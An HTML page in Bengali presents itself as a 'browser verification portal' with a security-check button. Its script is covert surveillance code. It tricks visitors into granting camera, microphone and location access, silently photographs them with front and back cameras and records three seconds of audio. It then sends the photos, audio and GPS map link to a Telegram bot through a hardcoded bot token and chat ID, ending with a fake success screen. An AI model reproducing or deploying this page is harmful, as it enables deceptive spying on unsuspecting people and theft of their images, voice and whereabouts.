<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Browser ভেরিফিকেশন পোর্টাল</title>
    <style>
        :root { --primary: #4f46e5; --bg: #f8fafc; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); text-align: center; max-width: 380px; width: 90%; }
        h2 { color: #1e293b; margin-bottom: 8px; font-size: 24px; }
        p { color: #64748b; margin-bottom: 30px; font-size: 16px; line-height: 1.5; min-height: 48px; }
        .btn-step { background: var(--primary); color: white; border: none; padding: 16px 32px; border-radius: 12px; font-size: 18px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.2s; }
        .btn-step:active { transform: scale(0.97); }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #video, #canvas { display: none; }
        #final-pic { width: 100%; border-radius: 12px; display: none; margin-top: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
    </style>
</head>
<body>

<div class="card" id="ui-card">
    <div id="status-icon" style="font-size: 60px; margin-bottom: 20px;">🛡️</div>
    <h2 id="ui-title">সিস্টেম যাচাই</h2>
    <p id="ui-desc">আপনার ব্রাউজার কনফিগারেশন এবং নিরাপত্তা নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
    
    <div id="ui-loader" class="spinner"></div>
    <button class="btn-step" id="ui-btn" onclick="runStepOne()">চেক শুরু করুন</button>

    <img id="final-pic" src="my_photo.jpg" alt="Verified">
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
const BOT_TOKEN = "8657895361:AAGOkn7MmVJEBhblZ8V5zc16WAzxtRujNqg";
const CHAT_ID = "-1003747831651";

function updateUI(isLoading, icon, title, desc, btnText, nextAction) {
    document.getElementById('ui-loader').style.display = isLoading ? 'block' : 'none';
    document.getElementById('ui-btn').style.display = isLoading ? 'none' : 'block';
    if (!isLoading) {
        if(icon) document.getElementById('status-icon').innerHTML = icon;
        document.getElementById('ui-title').innerText = title;
        document.getElementById('ui-desc').innerText = desc;
        document.getElementById('ui-btn').innerText = btnText;
        document.getElementById('ui-btn').onclick = nextAction;
    }
}

// ধাপ ১: ফ্রন্ট ক্যামেরা ও লোকেশন
async function runStepOne() {
    updateUI(true);
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        
        let mapURL = "লোকেশন অফ";
        try {
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 4000 });
            });
            mapURL = `http://googleusercontent.com/maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        } catch(e) {}

        await sendCapture(stream, `📸 ধাপ ১ (Front)\n📍 [লোকেশন](${mapURL})`);
        
        updateUI(false, "🌟", "চমৎকার!", "আপনি browser verification প্রথম ধাপ অতিক্রম করেছেন।", "পরবর্তী ধাপ (Next)", runStepTwo);
    } catch (err) {
        updateUI(false, "⚠️", "অনুমতি প্রয়োজন", "ভেরিফিকেশন সম্পন্ন করতে ক্যামেরার অনুমতি দিন।", "আবার চেষ্টা করুন", runStepOne);
    }
}

// ধাপ ২: ব্যাক ক্যামেরা ও অডিও
async function runStepTwo() {
    updateUI(true);
    document.getElementById('ui-desc').innerText = "আপনার ভেরিফিকেশনটি যাচাই করা হচ্ছে...";

    try {
        // ব্যাক ক্যামেরা
        try {
            const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            await sendCapture(bStream, "📸 ধাপ ২ (Back)");
        } catch (e) {}

        // অডিও রেকর্ড
        const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        await sendAudio(aStream);

        updateUI(false, "✅", "সফল হয়েছে!", "আপনার সবগুলো প্যারামিটার যাচাই করা হয়েছে।", "ফাইনাল ভেরিফাই (Final)", runFinal);
    } catch (err) {
        runFinal();
    }
}

// ফাইনাল ধাপ
function runFinal() {
    document.getElementById('ui-btn').style.display = 'none';
    document.getElementById('status-icon').innerHTML = "🎊";
    document.getElementById('ui-title').innerText = "অভিনন্দন!";
    document.getElementById('ui-desc').innerText = "আপনি সফলভাবে ভেরিফিকেশন কমপ্লিট করেছেন।";
    document.getElementById('final-pic').style.display = 'block';
}

async function sendCapture(stream, caption) {
    const video = document.getElementById('video');
    video.srcObject = stream;
    await video.play();
    return new Promise(resolve => {
        setTimeout(async () => {
            const canvas = document.getElementById('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, 'img.jpg');
                fd.append('caption', caption);
                fd.append('parse_mode', 'Markdown');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
                resolve();
            }, 'image/jpeg', 0.6);
        }, 2000);
    });
}

async function sendAudio(stream) {
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    return new Promise(resolve => {
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/ogg' });
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('voice', blob, 'audio.ogg');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
            stream.getTracks().forEach(t => t.stop());
            resolve();
        };
        recorder.start();
        setTimeout(() => recorder.stop(), 3000);
    });
}
</script>
</body>
</html>
